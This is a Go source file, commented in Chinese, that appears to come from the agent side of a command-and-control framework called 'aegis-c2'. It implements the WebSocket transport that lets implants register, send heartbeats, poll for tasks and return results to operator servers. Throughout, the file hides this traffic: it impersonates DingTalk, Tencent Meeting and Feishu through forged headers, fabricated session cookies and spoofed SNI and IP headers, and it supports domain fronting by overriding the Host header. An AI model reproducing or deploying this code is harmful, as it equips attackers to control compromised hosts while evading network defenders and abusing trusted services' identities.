// Package transport 提供 WebSocket C2 传输层。
// 用于 CDN/域前置场景：WebSocket over TLS 伪装成正常的 WebSocket 连接。
// Agent 端实现。
package transport

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/aegis-c2/aegis/shared/encoder"
	"github.com/aegis-c2/aegis/shared/protocol"
)

// === 流量伪装：2026 企业级 SaaS 指纹 ===

// CamouflageProfile 定义流量伪装配置。
type CamouflageProfile struct {
	Name           string            // 伪装目标 (dingtalk/tencent_meeting/feishu/zoom)
	UserAgent      string            // UA 字符串
	SecCHUA        string            // Sec-CH-UA (Client Hints)
	SecCHUAMobile  string            // Sec-CH-UA-Mobile
	SecCHUAPlatform string           // Sec-CH-UA-Platform
	SecCHUAFull    string            // Sec-CH-UA-Full-Version-List
	AcceptEncoding string            // Accept-Encoding
	AcceptLanguage string            // Accept-Language
	CookiePattern  string            // Cookie 格式模板
	WSServerName   string            // TLS SNI 覆盖（可选）
	ExtraHeaders   map[string]string // 额外伪装头部
}

// CamouflageProfiles 预定义的企业级伪装配置。
var CamouflageProfiles = map[string]CamouflageProfile{
	"dingtalk": {
		Name:           "DingTalk",
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		SecCHUA:        `"Not_A Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"`,
		SecCHUAMobile:  `?0`,
		SecCHUAPlatform: `"Windows"`,
		SecCHUAFull:    `"Not)A;Brand";v="99.0.0.0", "Chromium";v="131.0.6778.86", "Google Chrome";v="131.0.6778.86"`,
		AcceptEncoding: `gzip, deflate, br, zstd`,
		AcceptLanguage: `zh-CN,zh;q=0.9,en;q=0.8`,
		CookiePattern:  `cna={rand32}; cookie2={rand16}; t={epoch}; _m_h5_tk={randhex}; _m_h5_tk_enc={randhex}; xlly_s=1; tfstk={randhex};`,
		WSServerName:   "oapi.dingtalk.com",
		ExtraHeaders: map[string]string{
			"X-Real-IP":        "223.104.{r1}.{r2}",
			"X-Forwarded-For":  "223.104.{r1}.{r2}",
			"X-DT-TraceId":     "{randhex}",
			"X-DT-SpanId":      "{randhex}",
		},
	},
	"tencent_meeting": {
		Name:           "Tencent Meeting",
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		SecCHUA:        `"Not_A Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"`,
		SecCHUAMobile:  `?0`,
		SecCHUAPlatform: `"Windows"`,
		SecCHUAFull:    `"Not)A;Brand";v="99.0.0.0", "Chromium";v="131.0.6778.86", "Google Chrome";v="131.0.6778.86"`,
		AcceptEncoding: `gzip, deflate, br, zstd`,
		AcceptLanguage: `zh-CN,zh;q=0.9`,
		CookiePattern:  `traceid={randhex}; pgv_pvid={randhex}; _ga=GA1.{r1}.{rand32}.{epoch}; uin={rand32}; skey=@{rand8};`,
		WSServerName:   "meeting.tencent.com",
		ExtraHeaders: map[string]string{
			"X-Real-IP":       "183.60.{r1}.{r2}",
			"X-Forwarded-For": "183.60.{r1}.{r2}",
			"X-TMEETING-Seq":  "{rand32}",
		},
	},
	"feishu": {
		Name:           "Feishu/Lark",
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		SecCHUA:        `"Not_A Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"`,
		SecCHUAMobile:  `?0`,
		SecCHUAPlatform: `"Windows"`,
		SecCHUAFull:    `"Not)A;Brand";v="99.0.0.0", "Chromium";v="131.0.6778.86", "Google Chrome";v="131.0.6778.86"`,
		AcceptEncoding: `gzip, deflate, br, zstd`,
		AcceptLanguage: `zh-CN,zh;q=0.9,en;q=0.8`,
		CookiePattern:  `sessionid={randhex}; n_mh={rand16}; csrf_token={randhex}; passport_csrf_token={randhex};`,
		WSServerName:   "www.feishu.cn",
		ExtraHeaders: map[string]string{
			"X-Real-IP":       "124.192.{r1}.{r2}",
			"X-Forwarded-For": "124.192.{r1}.{r2}",
			"X-TT-TraceId":    "{randhex}",
		},
	},
	"chrome_default": {
		Name:           "Chrome 131 (Default)",
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		SecCHUA:        `"Not_A Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"`,
		SecCHUAMobile:  `?0`,
		SecCHUAPlatform: `"Windows"`,
		SecCHUAFull:    `"Not)A;Brand";v="99.0.0.0", "Chromium";v="131.0.6778.86", "Google Chrome";v="131.0.6778.86"`,
		AcceptEncoding: `gzip, deflate, br, zstd`,
		AcceptLanguage: `en-US,en;q=0.9`,
		CookiePattern:  "",
		WSServerName:   "",
		ExtraHeaders:   map[string]string{},
	},
	"edge_default": {
		Name:           "Edge 131",
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
		SecCHUA:        `"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		SecCHUAMobile:  `?0`,
		SecCHUAPlatform: `"Windows"`,
		SecCHUAFull:    `"Microsoft Edge";v="131.0.2903.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"`,
		AcceptEncoding: `gzip, deflate, br, zstd`,
		AcceptLanguage: `en-US,en;q=0.9`,
		CookiePattern:  "",
		WSServerName:   "",
		ExtraHeaders:   map[string]string{},
	},
}

// WSTransport 是 WebSocket C2 传输层。
// 支持 Profile 驱动的 URI/Header 变换、Host Rotation、Payload 编码。
type WSTransport struct {
	serverURLs    []string
	strategy      string // round-robin/random/failover
	userAgent     string
	cookieName    string
	dataTransform string
	insecureTLS   bool
	dialer        *websocket.Dialer
	frontConfig   *DomainFrontConfig // 域前置配置

	mu           sync.Mutex
	currentIndex int
	failCounts   map[string]int
	deadHosts    map[string]bool

	conn       *websocket.Conn
	connHost   string
	connMu     sync.Mutex

	// Yamux 多路复用（可选）
	yamuxSession *YamuxSession
	yamuxEnabled bool

	// 流量伪装
	camouflageProfile string // 伪装配置名称 (空=使用 profile 默认)

	// wsMu protects concurrent WriteMessage/ReadMessage on the same WebSocket.
	// gorilla/websocket allows one concurrent reader + one writer, so we serialize all ops.
	wsMu sync.Mutex
}

// NewWSTransport 创建 WebSocket 传输实例。
func NewWSTransport(cfg *ProfileConfig) *WSTransport {
	return NewWSTransportWithFront(cfg, nil)
}

// NewWSTransportWithFront 创建支持域前置的 WebSocket 传输实例。
func NewWSTransportWithFront(cfg *ProfileConfig, front *DomainFrontConfig) *WSTransport {
	dialer := &websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: cfg.InsecureTLS,
		},
	}

	t := &WSTransport{
		serverURLs:      cfg.ServerURLs,
		strategy:        cfg.RotationStrategy,
		userAgent:       cfg.UserAgent,
		cookieName:      cfg.CookieName,
		dataTransform:   cfg.DataTransform,
		insecureTLS:     cfg.InsecureTLS,
		dialer:          dialer,
		frontConfig:     front,
		camouflageProfile: cfg.Camouflage,
		failCounts:      make(map[string]int),
		deadHosts:       make(map[string]bool),
	}

	if len(t.serverURLs) == 0 {
		t.serverURLs = []string{"ws://127.0.0.1:8443/ws"}
	}

	return t
}

// connect 建立 WebSocket 连接。
func (t *WSTransport) connect() error {
	t.connMu.Lock()
	defer t.connMu.Unlock()

	if t.conn != nil {
		return nil // 已连接
	}

	host := t.getActiveHost()

	// 构建 WebSocket URL
	wsURL := host
	if t.cookieName != "" {
		wsURL += fmt.Sprintf("?%s=%s", t.cookieName, "session")
	}

	// 域前置：使用前端域名作为实际连接地址
	if t.frontConfig != nil {
		wsURL = BuildFrontedURL(t.frontConfig.FrontDomain, "/ws")
	}

	// 应用流量伪装配置
	camProfile := t.resolveCamouflageProfile()

	// 域置+SNI：前端域名优先，其次伪装 SNI
	if t.frontConfig != nil {
		t.dialer.TLSClientConfig.ServerName = t.frontConfig.FrontDomain
	} else if camProfile != nil && camProfile.WSServerName != "" {
		t.dialer.TLSClientConfig.ServerName = camProfile.WSServerName
	}

	headers := t.buildCamouflageHeaders(camProfile)

	// 域前置：Origin 设置为前端域名，不泄露真实后端地址
	if t.frontConfig != nil {
		extraHeaders := t.frontConfig.BuildFrontedHeaders()
		for k, v := range extraHeaders {
			headers.Set(k, v[0])
		}
		headers.Set("Origin", fmt.Sprintf("https://%s", t.frontConfig.FrontDomain))
	} else {
		headers.Set("Origin", host)
	}

	conn, _, err := t.dialer.Dial(wsURL, headers)
	if err != nil {
		t.recordFailure(host)
		return fmt.Errorf("websocket dial %s: %w", wsURL, err)
	}

	t.conn = conn
	t.connHost = host
	t.recordSuccess(host)
	return nil
}

// resolveCamouflageProfile 返回当前伪装配置，空则返回 nil。
func (t *WSTransport) resolveCamouflageProfile() *CamouflageProfile {
	if t.camouflageProfile == "" {
		return nil
	}
	if p, ok := CamouflageProfiles[t.camouflageProfile]; ok {
		return &p
	}
	if p, ok := CamouflageProfiles["chrome_default"]; ok {
		return &p
	}
	return nil
}

// buildCamouflageHeaders 根据伪装配置构建请求头。
func (t *WSTransport) buildCamouflageHeaders(camProfile *CamouflageProfile) http.Header {
	h := http.Header{}

	ua := t.userAgent
	if camProfile != nil {
		ua = camProfile.UserAgent
	}
	h.Set("User-Agent", ua)

	if camProfile == nil {
		return h
	}

	if camProfile.SecCHUA != "" {
		h.Set("Sec-CH-UA", camProfile.SecCHUA)
	}
	if camProfile.SecCHUAMobile != "" {
		h.Set("Sec-CH-UA-Mobile", camProfile.SecCHUAMobile)
	}
	if camProfile.SecCHUAPlatform != "" {
		h.Set("Sec-CH-UA-Platform", camProfile.SecCHUAPlatform)
	}
	if camProfile.SecCHUAFull != "" {
		h.Set("Sec-CH-UA-Full-Version-List", camProfile.SecCHUAFull)
	}
	if camProfile.AcceptEncoding != "" {
		h.Set("Accept-Encoding", camProfile.AcceptEncoding)
	}
	if camProfile.AcceptLanguage != "" {
		h.Set("Accept-Language", camProfile.AcceptLanguage)
	}
	if camProfile.CookiePattern != "" {
		h.Set("Cookie", t.applyCookiePattern(camProfile.CookiePattern))
	}
	for k, v := range camProfile.ExtraHeaders {
		h.Set(k, t.expandPlaceholders(v))
	}

	return h
}

// applyCookiePattern 将 Cookie 模板中的占位符替换为动态值。
func (t *WSTransport) applyCookiePattern(pattern string) string {
	return t.expandPlaceholders(pattern)
}

// expandPlaceholders 展开所有模板占位符。
func (t *WSTransport) expandPlaceholders(s string) string {
	result := s
	for strings.Contains(result, "{rand32}") {
		result = strings.Replace(result, "{rand32}", fmt.Sprintf("%08d", rand.Intn(100000000)), 1)
	}
	for strings.Contains(result, "{rand16}") {
		result = strings.Replace(result, "{rand16}", randHex(16), 1)
	}
	for strings.Contains(result, "{randhex}") {
		result = strings.Replace(result, "{randhex}", randHex(32), 1)
	}
	for strings.Contains(result, "{rand8}") {
		result = strings.Replace(result, "{rand8}", randHex(8), 1)
	}
	for strings.Contains(result, "{epoch}") {
		result = strings.Replace(result, "{epoch}", fmt.Sprintf("%d", time.Now().Unix()), 1)
	}
	for strings.Contains(result, "{r1}") {
		result = strings.Replace(result, "{r1}", fmt.Sprintf("%d", rand.Intn(254)+1), 1)
	}
	for strings.Contains(result, "{r2}") {
		result = strings.Replace(result, "{r2}", fmt.Sprintf("%d", rand.Intn(254)+1), 1)
	}
	return result
}

// randHex 生成 n 位随机 hex 字符串。
func randHex(n int) string {
	b := make([]byte, n/2+1)
	if _, err := crand.Read(b); err != nil {
		// fallback: use math/rand
		for i := range b {
			b[i] = byte(rand.Intn(256))
		}
	}
	return fmt.Sprintf("%x", b)[:n]
}

// send 通过 WebSocket 发送消息并接收响应。
func (t *WSTransport) send(env *protocol.Envelope) ([]byte, error) {
	// 编码 payload — 先拷贝避免修改原始数据（支持重试）
	payloadCopy := make([]byte, len(env.Payload))
	copy(payloadCopy, env.Payload)

	if t.dataTransform != "" {
		enc, err := encoder.GetEncoder(t.dataTransform)
		if err != nil {
			return nil, fmt.Errorf("encoder %q: %w", t.dataTransform, err)
		}
		payloadCopy = enc.Encode(payloadCopy)
	}

	// 拷贝 envelope 避免修改原始结构
	envCopy := *env
	envCopy.Payload = payloadCopy
	body, err := json.Marshal(&envCopy)
	if err != nil {
		return nil, err
	}

	if err := t.connect(); err != nil {
		return nil, err
	}

	t.connMu.Lock()
	conn := t.conn
	t.connMu.Unlock()

	if conn == nil {
		return nil, fmt.Errorf("no websocket connection")
	}

	// 发送（gorilla websocket 不是并发安全的，调用方需确保单线程）
	// wsMu 保护所有 WS 读写，防止 Yamux/正常 send 并发冲突
	t.wsMu.Lock()
	var resp []byte
	err = conn.WriteMessage(websocket.BinaryMessage, body)
	if err == nil {
		_, resp, err = conn.ReadMessage()
	}
	t.wsMu.Unlock()
	if err != nil {
		t.closeConn()
		return nil, err
	}
	return resp, nil
}

// closeConn 关闭当前 WebSocket 连接。
func (t *WSTransport) closeConn() {
	t.connMu.Lock()
	defer t.connMu.Unlock()
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
	}
}

// getActiveHost 根据策略选择下一个可用服务器。
func (t *WSTransport) getActiveHost() string {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.strategy == "random" {
		var alive []string
		for _, u := range t.serverURLs {
			if !t.deadHosts[u] {
				alive = append(alive, u)
			}
		}
		if len(alive) == 0 {
			t.deadHosts = make(map[string]bool)
			return t.serverURLs[0]
		}
		return alive[rand.Intn(len(alive))]
	}

	for i := 0; i < len(t.serverURLs); i++ {
		idx := (t.currentIndex + i) % len(t.serverURLs)
		url := t.serverURLs[idx]
		if !t.deadHosts[url] {
			t.currentIndex = idx
			return url
		}
	}
	t.deadHosts = make(map[string]bool)
	t.currentIndex = 0
	return t.serverURLs[0]
}

func (t *WSTransport) recordSuccess(url string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.failCounts[url] = 0
}

func (t *WSTransport) recordFailure(url string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.failCounts[url]++
	if t.failCounts[url] >= 3 {
		t.deadHosts[url] = true
	}
}

// Register 发送注册请求。
func (t *WSTransport) Register(env *protocol.Envelope) (*map[string]string, error) {
	return t.WSSRegister(env)
}

// Heartbeat 发送心跳。
func (t *WSTransport) Heartbeat(env *protocol.Envelope) (*map[string]string, error) {
	return t.WSHeartbeat(env)
}

// PollTask 拉取任务。
func (t *WSTransport) PollTask(env *protocol.Envelope) ([]byte, error) {
	return t.WSPollTask(env)
}

// SubmitResult 回传结果。
func (t *WSTransport) SubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	return t.WSSubmitResult(env)
}

// WSSRegister 发送注册请求（alias for Register）。
func (t *WSTransport) WSSRegister(env *protocol.Envelope) (*map[string]string, error) {
	resp, err := t.send(env)
	if err != nil {
		return nil, err
	}
	return parseStringResponse(resp)
}

// WSHeartbeat 发送心跳（alias for Heartbeat）。
func (t *WSTransport) WSHeartbeat(env *protocol.Envelope) (*map[string]string, error) {
	resp, err := t.send(env)
	if err != nil {
		return nil, err
	}
	return parseStringResponse(resp)
}

// WSPollTask 拉取任务（alias for PollTask）。
func (t *WSTransport) WSPollTask(env *protocol.Envelope) ([]byte, error) {
	return t.send(env)
}

// WSSubmitResult 回传结果（alias for SubmitResult）。
func (t *WSTransport) WSSubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	resp, err := t.send(env)
	if err != nil {
		return nil, err
	}
	return parseStringResponse(resp)
}

// Close 关闭所有连接。
func (t *WSTransport) Close() error {
	// Yamux runs over the WebSocket — close Yamux first
	if t.yamuxSession != nil {
		t.yamuxSession.Close()
	}
	t.closeConn()
	return nil
}

// EnableYamux 在现有 WebSocket 连接上启用 Yamux 多路复用。
// 先发送 MUX/1 前缀消息，再创建客户端 Yamux 会话。
func (t *WSTransport) EnableYamux() error {
	t.connMu.Lock()
	defer t.connMu.Unlock()
	if t.conn == nil {
		return fmt.Errorf("no websocket connection")
	}

	// 发送 MUX/1 前缀 — 需要 wsMu 保护 WebSocket 写入
	t.wsMu.Lock()
	err := t.conn.WriteMessage(websocket.BinaryMessage, []byte("MUX/1"))
	t.wsMu.Unlock()
	if err != nil {
		return fmt.Errorf("write yamux preface: %w", err)
	}

	// 创建客户端会话（带信号量 + ping）
	wrapper := &wsConnWrapper{conn: t.conn}
	sess, err := NewClient(wrapper)
	if err != nil {
		return err
	}
	t.yamuxSession = sess
	t.yamuxEnabled = true
	return nil
}

// SendYamux 通过 Yamux 流发送消息并接收响应。
func (t *WSTransport) SendYamux(env *protocol.Envelope) ([]byte, error) {
	t.connMu.Lock()
	sess := t.yamuxSession
	t.connMu.Unlock()

	if sess == nil {
		return nil, fmt.Errorf("yamux not enabled")
	}

	// 编码 payload（使用副本避免修改原始 env.Payload）
	if t.dataTransform != "" {
		enc, err := encoder.GetEncoder(t.dataTransform)
		if err != nil {
			return nil, fmt.Errorf("encoder %q: %w", t.dataTransform, err)
		}
		payloadCopy := make([]byte, len(env.Payload))
		copy(payloadCopy, env.Payload)
		envCopy := *env
		envCopy.Payload = enc.Encode(payloadCopy)
		env = &envCopy
	}

	body, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}

	// 打开新流（受 sendSem 限制）
	stream, err := sess.OpenStream()
	if err != nil {
		return nil, fmt.Errorf("open yamux stream: %w", err)
	}
	defer stream.Close()

	// 发送
	if _, err := stream.Write(body); err != nil {
		return nil, err
	}

	// 接收响应 — 分块读取避免预分配 64KB 缓冲区导致 OOM
	resp := make([]byte, 0, 4096)
	buf := make([]byte, 8192)
	for {
		n, err := stream.Read(buf)
		if n > 0 {
			resp = append(resp, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return resp, nil
}

// YamuxEnabled 返回 Yamux 是否已启用。
func (t *WSTransport) YamuxEnabled() bool {
	return t.yamuxEnabled
}

// YamuxSession 返回底层 Yamux 会话。
func (t *WSTransport) YamuxSession() *YamuxSession {
	return t.yamuxSession
}

func parseStringResponse(data []byte) (*map[string]string, error) {
	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}
	strResult := make(map[string]string)
	for k, v := range result {
		strResult[k] = fmt.Sprintf("%v", v)
	}
	return &strResult, nil
}

// WSEnvelope 是 WebSocket 传输的通信容器。
type WSEnvelope struct {
	Timestamp int64    `json:"timestamp"`
	AgentID   string   `json:"agent_id"`
	Type      string   `json:"message_type"`
	Payload   []byte   `json:"payload"`
	Nonce     []byte   `json:"nonce"`
}

// BuildWSEnvelope 构建 WebSocket 通信容器。
func BuildWSEnvelope(msgType string, payload, nonce []byte, agentID string) *WSEnvelope {
	return &WSEnvelope{
		Timestamp: time.Now().UnixMilli(),
		AgentID:   agentID,
		Type:      msgType,
		Payload:   payload,
		Nonce:     nonce,
	}
}

// ToProtocolEnvelope 转换为 protocol.Envelope。
func (w *WSEnvelope) ToProtocolEnvelope() *protocol.Envelope {
	return &protocol.Envelope{
		Timestamp: w.Timestamp,
		AgentID:   w.AgentID,
		Type:      w.Type,
		Payload:   w.Payload,
		Nonce:     w.Nonce,
	}
}

// FromProtocolEnvelope 从 protocol.Envelope 创建 WSEnvelope。
func FromProtocolEnvelope(e *protocol.Envelope) *WSEnvelope {
	return &WSEnvelope{
		Timestamp: e.Timestamp,
		AgentID:   e.AgentID,
		Type:      e.Type,
		Payload:   e.Payload,
		Nonce:     e.Nonce,
	}
}

// DomainFrontConfig 是域前置配置。
type DomainFrontConfig struct {
	FrontDomain  string            // 前端域名（CDN 高权重域名）
	BackendHost  string            // 后端真实 Host header
	ExtraHeaders map[string]string // 额外头部（用于绕过 CDN 检测）
}

// BuildFrontedURL 构建域前置 URL。
func BuildFrontedURL(frontDomain, path string) string {
	return fmt.Sprintf("wss://%s%s", frontDomain, path)
}

// BuildFrontedHeaders 构建域前置请求头。
func (d *DomainFrontConfig) BuildFrontedHeaders() http.Header {
	h := http.Header{}
	h.Set("Host", d.BackendHost) // 关键：Host header 覆盖
	for k, v := range d.ExtraHeaders {
		h.Set(k, v)
	}
	return h
}
